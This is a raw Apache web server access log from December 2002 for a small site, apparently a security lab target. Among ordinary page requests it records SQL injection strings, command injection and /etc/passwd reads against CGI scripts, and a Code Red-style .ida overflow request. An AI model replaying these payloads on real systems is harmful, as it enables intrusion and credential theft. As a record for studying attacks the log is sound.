128.111.48.107 - - [05/Dec/2002:18:25:33 -0800] "GET / HTTP/1.1" 200 2890 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:25:33 -0800] "GET /poweredby.png HTTP/1.1" 200 1154 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:25:33 -0800] "GET /icons/apache_pb.gif HTTP/1.1" 200 2326 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:25:33 -0800] "GET /favicon.ico HTTP/1.1" 404 283 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:29:06 -0800] "GET /cgi-bin/query_extension.pl HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:29:13 -0800] "GET /cgi-bin/query_extension.pl?Schmidt HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:29:22 -0800] "GET /cgi-bin/query_extension.pl?Schmidt HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:29:26 -0800] "GET /cgi-bin/query_extension.pl?schmidt HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:30:11 -0800] "GET /cgi-bin/query_extension.pl?schmidt HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:30:14 -0800] "GET /cgi-bin/query_extension.pl?Schmidt HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:18:30:45 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 313 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:19:18 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 313 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:19:20 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 313 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:20:26 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 313 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:20:28 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 313 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:38:26 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:38:41 -0800] "GET /cgi-bin/query_extension.pl?cboname=Sexton HTTP/1.1" 200 392 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:39:46 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27Sexton%20and%20true%27 HTTP/1.1" 200 341 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:40:05 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt' HTTP/1.1" 200 319 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:20:48:36 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt%27%20or%20last%20!='Schmidt HTTP/1.1" 200 1296 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:21:23:31 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:21:23:35 -0800] "GET /cgi-bin/query_extension.pl?cboname=Sexton HTTP/1.1" 200 392 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
24.189.153.176 - - [05/Dec/2002:22:29:41 -0800] "OPTIONS / HTTP/1.1" 200 - "-" "Microsoft-WebDAV-MiniRedir/5.1.2600"
61.219.249.172 - - [05/Dec/2002:23:01:13 -0800] "GET /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a  HTTP/1.0" 400 318 "-" "-"
128.111.48.107 - - [05/Dec/2002:23:20:54 -0800] "GET /cgi-bin/query_extension.pl?cboname=Sexton HTTP/1.1" 200 392 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [05/Dec/2002:23:21:14 -0800] "GET /cgi-bin/query_extension.pl?cboname=Sexton HTTP/1.1" 200 392 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:18:39 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:18:39 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:18:39 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:18:39 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:18:57 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:19:04 -0800] "GET /contact.html HTTP/1.1" 200 1207 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:21:30 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:21:38 -0800] "GET /cgi-bin/query_extension.pl?cboname=Sexton HTTP/1.1" 200 392 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:21:43 -0800] "GET /cgi-bin/query_extension.pl?cboname=Sexton HTTP/1.1" 200 311 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:21:58 -0800] "GET /cgi-bin/query_extension.pl?cboname=Tard HTTP/1.1" 200 321 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:22:07 -0800] "GET /contact.html HTTP/1.1" 200 1207 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:22:19 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 313 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:22:21 -0800] "GET /cgi-bin/query_extension.pl?cboname=dasfdsf HTTP/1.1" 200 327 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:22:25 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:22:36 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 631 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:22:41 -0800] "GET /cgi-bin/guestbook.pl HTTP/1.1" 200 348 "http://128.111.48.15/cgi-bin/save_message.pl" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:23:38 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:23:55 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1812 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:24:16 -0800] "GET /cgi-bin/guestbook.pl?;ls HTTP/1.1" 200 443 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:24:45 -0800] "GET /contact.html HTTP/1.1" 200 1207 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:06 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+or+last+%21%3D+%27Schmidt%27 HTTP/1.1" 200 355 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:17 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:20 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:27 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 647 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:36 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 647 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:41 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 647 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:49 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:25:51 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:26:31 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:26:37 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt;ls HTTP/1.1" 200 727 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:26:43 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt;/bin/bash HTTP/1.1" 200 632 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:27:14 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1812 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:28:11 -0800] "GET /contact.html HTTP/1.1" 200 1207 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:28:14 -0800] "GET /cgi-bin/query_extension.pl?cboname=hello HTTP/1.1" 200 323 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:28:20 -0800] "GET /cgi-bin/query_extension.pl?cboname=Tard HTTP/1.1" 200 321 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:00:28:44 -0800] "GET /cgi-bin/query_extension.pl?cboname=%27+or+last+%21%3D+%27Schmidt HTTP/1.1" 200 1262 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:06 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:07 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:07 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:07 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:17 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:17 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:17 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:17 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:20 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:20 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:20 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:20 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:23 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:26 -0800] "GET /contact.html HTTP/1.1" 200 1207 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:31 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:37 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:51 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:00:58 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt;/bin/bashcat%20/etc/passwd HTTP/1.1" 200 632 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:01:06 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt;cat%20/etc/passwd HTTP/1.1" 200 632 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:01:10 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt;cat%20/etc/passwd HTTP/1.1" 200 632 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:01:22 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1872 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:05:05 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:05:19 -0800] "GET /cgi-bin/guestbook.pl?/etc/passwd HTTP/1.1" 200 1872 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:11:16 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 691 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:12:40 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 691 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:13:38 -0800] "POST /cgi-bin/save_message.pl HTTP/1.1" 200 645 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:32:29 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:32:31 -0800] "GET /contact.html HTTP/1.1" 200 1207 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
128.111.48.107 - - [06/Dec/2002:01:32:35 -0800] "GET /cgi-bin/query_extension.pl?cboname=Schmidt HTTP/1.1" 200 349 "http://128.111.48.15/contact.html" "Mozilla/5.0 (compatible; Konqueror/3.0.0-10; Linux 2.4.18-3)"
68.81.7.100 - - [06/Dec/2002:05:20:56 -0800] "OPTIONS / HTTP/1.1" 200 - "-" "Microsoft-WebDAV-MiniRedir/5.1.2600"
128.111.48.69 - - [06/Dec/2002:10:54:02 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:02 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:02 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:02 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:12 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:16 -0800] "GET /financial.html HTTP/1.1" 200 1369 "http://128.111.48.15/history.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:20 -0800] "GET /contact.html HTTP/1.1" 200 1286 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:32 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.48.69 - - [06/Dec/2002:10:54:37 -0800] "GET /cgi-bin/guestbook.pl?guestbook.txt HTTP/1.1" 200 632 "http://128.111.48.15/feedback.html" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.0.1) Gecko/20021003"
128.111.43.65 - - [06/Dec/2002:11:53:46 -0800] "GET /mod_ssl:error:HTTP-request HTTP/1.0" 400 514
128.111.43.65 - - [06/Dec/2002:11:53:55 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
128.111.43.61 - - [06/Dec/2002:12:13:00 -0800] "GET / HTTP/1.0" 200 1494 "-" "Wget/1.8.1"
128.111.43.25 - - [06/Dec/2002:12:13:22 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:13:26 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:13:27 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:13:27 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.25 - - [06/Dec/2002:12:13:29 -0800] "GET /favicon.ico HTTP/1.1" 404 283 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.58 - - [06/Dec/2002:12:13:31 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:13:31 -0800] "GET /basstard.css HTTP/1.0" 200 793 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:13:32 -0800] "GET /basstard_title.png HTTP/1.0" 200 5316 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:13:32 -0800] "GET /basstard.png HTTP/1.0" 200 18660 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:13:37 -0800] "GET / HTTP/1.1" 200 1494 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:13:37 -0800] "GET /basstard.css HTTP/1.1" 200 793 "http://128.111.48.15/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:13:37 -0800] "GET /basstard_title.png HTTP/1.1" 200 5316 "http://128.111.48.15/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:13:37 -0800] "GET /basstard.png HTTP/1.1" 200 18660 "http://128.111.48.15/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.25 - - [06/Dec/2002:12:13:37 -0800] "GET /feedback.html HTTP/1.1" 200 1307 "http://128.111.48.15/" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.58 - - [06/Dec/2002:12:13:51 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:14:00 -0800] "GET /history.html HTTP/1.1" 200 1226 "http://128.111.48.15/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.32 - - [06/Dec/2002:12:14:05 -0800] "GET /contact.html HTTP/1.1" 200 1286 "http://128.111.48.15/" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.58 - - [06/Dec/2002:12:14:26 -0800] "GET /cgi-bin/query_extension.pl?cboname=giovani HTTP/1.0" 200 315 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:14:30 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:14:35 -0800] "GET /cgi-bin/query_extension.pl?cboname=golnaz HTTP/1.0" 200 313 "http://128.111.48.15/contact.html" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:14:38 -0800] "GET /contact.html HTTP/1.0" 200 1286 "http://128.111.48.15/" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.58 - - [06/Dec/2002:12:14:41 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:14:47 -0800] "GET /checkperl.pl HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
128.111.43.25 - - [06/Dec/2002:12:14:51 -0800] "GET /cgi-bin/save_message.pl?first=jon HTTP/1.1" 200 645 "-" "Mozilla/5.0 (compatible; Konqueror/3; Linux)"
128.111.43.58 - - [06/Dec/2002:12:14:52 -0800] "GET / HTTP/1.0" 200 1494 "-" "Mozilla/4.79 [en] (X11; U; Linux 2.4.18-18.7.x i686)"
128.111.43.32 - - [06/Dec/2002:12:14:55 -0800] "GET /cgi-bin/checkperl.pl HTTP/1.1" 200 44 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.2) Gecko/20021126"
